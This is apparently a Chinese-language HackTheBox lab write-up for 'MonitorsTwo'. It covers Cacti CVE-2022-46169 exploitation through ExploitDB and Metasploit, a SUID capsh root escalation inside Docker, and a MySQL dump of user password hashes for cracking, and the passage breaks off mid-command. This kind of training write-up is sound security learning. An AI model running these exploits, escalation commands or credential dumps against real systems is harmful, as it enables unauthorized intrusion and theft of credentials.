+      <a href="../HTB-Headless/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Headless
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      扫描
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞分析
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#80" class="md-nav__link">
+    <span class="md-ellipsis">
+      80端口
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Initial Access
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Initial Access">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#poc-cve-2022-46169" class="md-nav__link">
+    <span class="md-ellipsis">
+      PoC (CVE-2022-46169)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PoC (CVE-2022-46169)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1exploitdb" class="md-nav__link">
+    <span class="md-ellipsis">
+      方法1：ExploitDB 脚本
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2metasploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      方法2：metasploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docker" class="md-nav__link">
+    <span class="md-ellipsis">
+      docker容器
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="docker容器">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#suid" class="md-nav__link">
+    <span class="md-ellipsis">
+      SUID提权（不需要）
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#db" class="md-nav__link">
+    <span class="md-ellipsis">
+      探索DB
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      密码暴破
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag-user" class="md-nav__link">
+    <span class="md-ellipsis">
+      flag: user
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      探索
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#poc-cve-2021-41091" class="md-nav__link">
+    <span class="md-ellipsis">
+      PoC (CVE-2021-41091)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      flag: root
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      总结·后记
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+  
+<nav class="md-tags" >
+  
+    
+    
+    
+      <span class="md-tag">HTB/Linux</span>
+    
+  
+    
+    
+    
+      <span class="md-tag">HTB/Easy</span>
+    
+  
+</nav>
+
+
+  
+  
+
+
+  <h1>HTB-MonitorsTwo</h1>
+
+<p>考完CEH，久违地回来打一打靶。都有点忘了怎么操作了……</p>
+<hr />
+<h2 id="_1">扫描<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span>-sS<span class="w"> </span>-p<span class="w"> </span><span class="m">1</span>-10000<span class="w"> </span>--min-rate<span class="o">=</span><span class="m">5000</span><span class="w"> </span><span class="m">10</span>.10.11.211
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-v<span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span>-sV<span class="w"> </span>-O<span class="w"> </span>-p<span class="w"> </span><span class="m">22</span>,80<span class="w"> </span>--script<span class="o">=</span>vuln<span class="w"> </span><span class="m">10</span>.10.11.211<span class="w"> </span>-oA<span class="w"> </span><span class="m">10</span>.10.11.211
+</span></code></pre></div>
+<p><em>不知道为什么这次NSE脚本扫描非常非常慢，然后其实也没太多有用的信息。</em></p>
+<ul>
+<li>22</li>
+<li>80</li>
+</ul>
+<h2 id="_2">漏洞分析<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h3 id="80">80端口<a class="headerlink" href="#80" title="Permanent link">&para;</a></h3>
+<p>访问目标网站，是个登陆界面。简单试了下单引号登陆，简单地报错了。留意到页面下方写了行 <strong>Version 1.2.22 | (c) 2004-2023 - The Cacti Group</strong>。</p>
+<p>于是先尝试本地搜一波，<code>searchsploit cacti</code> 发现这个：</p>
+<blockquote>
+<p>Cacti v1.2.22 - Remote Command Execution (RCE) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | php/webapps/51166.py</p>
+</blockquote>
+<h2 id="initial-access">Initial Access<a class="headerlink" href="#initial-access" title="Permanent link">&para;</a></h2>
+<h3 id="poc-cve-2022-46169">PoC (<a href="https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/">CVE-2022-46169</a>)<a class="headerlink" href="#poc-cve-2022-46169" title="Permanent link">&para;</a></h3>
+<h4 id="1exploitdb">方法1：ExploitDB 脚本<a class="headerlink" href="#1exploitdb" title="Permanent link">&para;</a></h4>
+<p>开搞，复制脚本到当前目录：<code>searchsploit -m 51166</code></p>
+<p>不过脚本运行起来一直拿不到shell……</p>
+<p>谷歌一下倒是也有其他exp，但是就是想弄明白为什么ExploitDB这个exp不行。</p>
+<p>然后<a href="https://blog.csdn.net/qq_58869808/article/details/130482162">这篇文章</a>给了我提示，看来要理解漏洞原理啊……更改了一下exp脚本中的 <code>'X-Forwarded-For': f'{local_cacti_ip}'</code>，将其直接指定为 <code>'X-Forwarded-For': f'127.0.0.1'</code>。</p>
+<p>运行后成功getshell：
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>bash-5.1$<span class="w"> </span>id
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>id
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nv">uid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span>
+</span></code></pre></div></p>
+<p>想升为交互shell来着不过没装python，暂时先将就着了。
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>bash-5.1$<span class="w"> </span>which<span class="w"> </span>python<span class="w"> </span>python2<span class="w"> </span>python3
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>which<span class="w"> </span>python<span class="w"> </span>python2<span class="w"> </span>python3
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>bash-5.1$<span class="w"> </span>
+</span></code></pre></div></p>
+<h4 id="2metasploit">方法2：metasploit<a class="headerlink" href="#2metasploit" title="Permanent link">&para;</a></h4>
+<p>谷歌的时候发现metasploit也有exp</p>
+<blockquote>
+<p><a href="https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/">https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/</a></p>
+</blockquote>
+<p>不过最开始试了试也不行，主要是两种报错：</p>
+<ol>
+<li>开启nc监听的话就会报错本地端口被占用（太久不用msf人都傻了，似乎本身就不用另外开启监听……）</li>
+<li>显示利用成功但是没建立连接（报错信息如下）<div class="language-text highlight"><pre><span></span><code>[*] Command Stager progress - 100.00% done (1118/1118 bytes)
+[*] Exploit completed, but no session was created.
+</code></pre></div>
+</li>
+</ol>
+<p><em>后来偶然多试几次就可以了……有点迷。看来以后出现上述报错信息的话就说明利用是成功的只是得多试几次？</em></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>getuid
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Server<span class="w"> </span>username:<span class="w"> </span>www-data
+</span></code></pre></div>
+<h2 id="docker">docker容器<a class="headerlink" href="#docker" title="Permanent link">&para;</a></h2>
+<p>稍微探索了一下什么都没发现，家目录没东西，很多命令如<code>sudo</code>、<code>ifconfig</code>都没有，直接<code>find</code>命令搜user.txt也找不到flag。感觉有点不同于一般easy机器的套路。</p>
+<p>狡猾地用Meterpreter连上去收集一下信息，发现有172.19的IP——这是docker的默认网段之一。于是直接跑去根目录看看是否有 <code>.dockerenv</code> 文件，结果果然是在docker容器里啊。</p>
+<p><em>后来看了下LinPEAS是如何收集网络信息的：查看 <code>/etc/hosts</code> 文件。</em></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>sysinfo
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>Computer<span class="w">     </span>:<span class="w"> </span><span class="m">172</span>.19.0.3
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>OS<span class="w">           </span>:<span class="w"> </span>Debian<span class="w"> </span><span class="m">11</span>.5<span class="w"> </span><span class="o">(</span>Linux<span class="w"> </span><span class="m">5</span>.4.0-147-generic<span class="o">)</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>Architecture<span class="w"> </span>:<span class="w"> </span>x64
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>BuildTuple<span class="w">   </span>:<span class="w"> </span>i486-linux-musl
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>Meterpreter<span class="w">  </span>:<span class="w"> </span>x86/linux
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>ifconfig
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>Interface<span class="w">  </span><span class="nv">1</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="o">============</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>Name<span class="w">         </span>:<span class="w"> </span>lo
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>Hardware<span class="w"> </span>MAC<span class="w"> </span>:<span class="w"> </span><span class="m">00</span>:00:00:00:00:00
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>MTU<span class="w">          </span>:<span class="w"> </span><span class="m">65536</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>Flags<span class="w">        </span>:<span class="w"> </span>UP,LOOPBACK
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>IPv4<span class="w"> </span>Address<span class="w"> </span>:<span class="w"> </span><span class="m">127</span>.0.0.1
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>IPv4<span class="w"> </span>Netmask<span class="w"> </span>:<span class="w"> </span><span class="m">255</span>.0.0.0
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>Interface<span class="w">  </span><span class="nv">8</span>
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="o">============</span>
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>Name<span class="w">         </span>:<span class="w"> </span>eth0
+</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>Hardware<span class="w"> </span>MAC<span class="w"> </span>:<span class="w"> </span><span class="m">02</span>:42:ac:13:00:03
+</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>MTU<span class="w">          </span>:<span class="w"> </span><span class="m">1500</span>
+</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>Flags<span class="w">        </span>:<span class="w"> </span>UP,BROADCAST,MULTICAST
+</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>IPv4<span class="w"> </span>Address<span class="w"> </span>:<span class="w"> </span><span class="m">172</span>.19.0.3
+</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>IPv4<span class="w"> </span>Netmask<span class="w"> </span>:<span class="w"> </span><span class="m">255</span>.255.0.0
+</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>
+</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a>
+</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>ls
+</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a>Listing:<span class="w"> </span>/
+</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a><span class="o">==========</span>
+</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a>
+</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a>Mode<span class="w">              </span>Size<span class="w">   </span>Type<span class="w">  </span>Last<span class="w"> </span>modified<span class="w">              </span>Name
+</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a>----<span class="w">              </span>----<span class="w">   </span>----<span class="w">  </span>-------------<span class="w">              </span>----
+</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a><span class="m">100755</span>/rwxr-xr-x<span class="w">  </span><span class="m">0</span><span class="w">      </span>fil<span class="w">   </span><span class="m">2023</span>-03-21<span class="w"> </span><span class="m">06</span>:49:05<span class="w"> </span>-0400<span class="w">  </span>.dockerenv
+</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a>……
+</span></code></pre></div>
+<p>以及根目录还有个 <code>entrypoint.sh</code> 不知道是干啥的。</p>
+<p><em>以前好像打过关于与docker的，但是完全不记得过程了……</em></p>
+<h3 id="suid">SUID提权（不需要）<a class="headerlink" href="#suid" title="Permanent link">&para;</a></h3>
+<p>继续基础信息收集看看，SUID：
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>bash-5.1$<span class="w"> </span>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span><span class="s2">&quot;{}&quot;</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span><span class="s2">&quot;{}&quot;</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>-rwsr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">88304</span><span class="w"> </span>Feb<span class="w">  </span><span class="m">7</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>/usr/bin/gpasswd
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>-rwsr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">63960</span><span class="w"> </span>Feb<span class="w">  </span><span class="m">7</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>/usr/bin/passwd
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>-rwsr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">52880</span><span class="w"> </span>Feb<span class="w">  </span><span class="m">7</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>/usr/bin/chsh
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>-rwsr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">58416</span><span class="w"> </span>Feb<span class="w">  </span><span class="m">7</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>/usr/bin/chfn
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>-rwsr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">44632</span><span class="w"> </span>Feb<span class="w">  </span><span class="m">7</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>/usr/bin/newgrp
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>-rwsr-sr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w"> </span><span class="m">16664</span><span class="w"> </span>May<span class="w"> </span><span class="m">14</span><span class="w"> </span><span class="m">22</span>:03<span class="w"> </span>/tmp/suid
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>-rwsr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">30872</span><span class="w"> </span>Oct<span class="w"> </span><span class="m">14</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>/sbin/capsh
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>-rwsr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">55528</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">20</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>/bin/mount
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>-rwsr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">35040</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">20</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>/bin/umount
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>-rwsr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">1234376</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">27</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>/bin/bash
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>-rwsr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">71912</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">20</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>/bin/su
+</span></code></pre></div></p>
+<p>有些不咋见到的，比如 <code>capsh</code>，在GTFBins搜搜看，发现能利用：
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>bash-5.1$<span class="w"> </span>/sbin/capsh<span class="w"> </span>--gid<span class="o">=</span><span class="m">0</span><span class="w"> </span>--uid<span class="o">=</span><span class="m">0</span><span class="w"> </span>--
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>/sbin/capsh<span class="w"> </span>--gid<span class="o">=</span><span class="m">0</span><span class="w"> </span>--uid<span class="o">=</span><span class="m">0</span><span class="w"> </span>--
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>id
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
+</span></code></pre></div></p>
+<p>拿到docker的root权限。</p>
+<p><em>然后发现自己拿到root权限也不知道要干啥……事前也没太多思路，一心想着提权都是走一步看一步，感觉这个习惯不好啊。</em></p>
+<h3 id="db">探索DB<a class="headerlink" href="#db" title="Permanent link">&para;</a></h3>
+<p>想起来根目录还有个 <code>entrypoint.sh</code> 文件觉得很可疑，之前由于没有root权限也没怎么看。现在看看脚本似乎是在部署DB？关注到里面有一行 
+<code>mysql --host=db --user=root --password=root cacti -e "show tables"</code>。运行了一下脚本也确实显示了tables。所以想着应该可以修改这个命令探索 <code>cacti</code> 这个DB。</p>
+<p><em>后来发现这条命令甚至这个脚本其实不用root权限也能执行……因为bash命令设置了root权限的SUID，而mysql命令里直接给了账号密码去连接DB……</em></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>bash-5.1$<span class="w"> </span>mysql<span class="w"> </span>--host<span class="o">=</span>db<span class="w"> </span>--user<span class="o">=</span>root<span class="w"> </span>--password<span class="o">=</span>root<span class="w"> </span>cacti<span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;select * from user_auth&quot;</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>&lt;<span class="w"> </span>--password<span class="o">=</span>root<span class="w"> </span>cacti<span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;select * from user_auth&quot;</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>id<span class="w">      </span>username<span class="w">        </span>password<span class="w">        </span>realm<span class="w">   </span>full_name<span class="w">       </span>email_address<span class="w">   </span>must_change_password<span class="w">    </span>password_change<span class="w">    </span>show_tree<span class="w">       </span>show_list<span class="w">       </span>show_preview<span class="w">    </span>graph_settings<span class="w">  </span>login_opts<span class="w">      </span>policy_graphs<span class="w">   </span>policy_trees<span class="w">       </span>policy_hosts<span class="w">    </span>policy_graph_templates<span class="w">  </span>enabled<span class="w"> </span>lastchange<span class="w">      </span>lastlogin<span class="w">       </span>password_history<span class="w">        </span>locked<span class="w">     </span>failed_attempts<span class="w"> </span>lastfail<span class="w">        </span>reset_perms
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="m">1</span><span class="w">       </span>admin<span class="w">   </span><span class="nv">$2</span>y<span class="nv">$10$IhEA</span>.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC<span class="w">    </span><span class="m">0</span><span class="w">       </span>Jamie<span class="w"> </span>Thompson<span class="w">  </span>admin@monitorstwo.htb<span class="w">              </span>on<span class="w">      </span>on<span class="w">      </span>on<span class="w">      </span>on<span class="w">      </span>on<span class="w">      </span><span class="m">2</span><span class="w">       </span><span class="m">1</span><span class="w">       </span><span class="m">1</span><span class="w">       </span><span class="m">1</span><span class="w">       </span><span class="m">1</span><span class="w">       </span>on<span class="w">      </span>-1-1<span class="w">       </span>-1<span class="w">              </span><span class="m">0</span><span class="w">       </span><span class="m">0</span><span class="w">       </span><span class="m">663348655</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="m">3</span><span class="w">       </span>guest<span class="w">   </span>43e9a4ab75570f5b<span class="w">        </span><span class="m">0</span><span class="w">       </span>Guest<span class="w"> </span>Account<span class="w">           </span>on<span class="w">      </span>on<span class="w">      </span>on<span class="w">      </span>on<span class="w">      </span>on<span class="w">      </span><span class="m">3</span><span class="w"> </span><span class="m">11</span><span class="w">       </span><span class="m">1</span><span class="w">       </span><span class="m">1</span><span class="w">       </span><span class="m">1</span><span class="w">               </span>-1<span class="w">      </span>-1<span class="w">      </span>-1<span class="w">              </span><span class="m">0</span><span class="w">       </span><span class="m">0</span><span class="w">       </span><span class="m">0</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="m">4</span><span class="w">       </span>marcus<span class="w">  </span><span class="nv">$2</span>y<span class="nv">$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1</span>.3WeKlBn70JonsdW/MhFYK4C<span class="w">    </span><span class="m">0</span><span class="w">       </span>Marcus<span class="w"> </span>Brune<span class="w">    </span>marcus@monitorstwo.htb<span class="w">                     </span>on<span class="w">      </span>on<span class="w">      </span>on<span class="w">      </span>on<span class="w">      </span><span class="m">1</span><span class="w">       </span><span class="m">1</span><span class="w">       </span><span class="m">1</span><span class="w">       </span><span class="m">1</span><span class="w">       </span><span class="m">1</span><span class="w">       </span>on<span class="w">      </span>-1-1<span class="w">               </span>on<span class="w">      </span><span class="m">0</span><span class="w">       </span><span class="m">0</span><span class="w">       </span><span class="m">2135691668</span>
+</span></code></pre></div>
+<h3 id="_3">密码暴破<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>从DB里拿到3个密码，感觉guest那个太短、格式也和另外两个差很多。最有可能是拿到marcus或者admin的密码然后SSH连接目标主机？或者进cacti的管理界面去探索主机的访问。<br />
+稍微整理如下，方便等下给JTR暴破：
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>└─$<span class="w"> </span>cat<span class="w"> </span>user_auth_fromSQL.txt<span class="w"> </span>
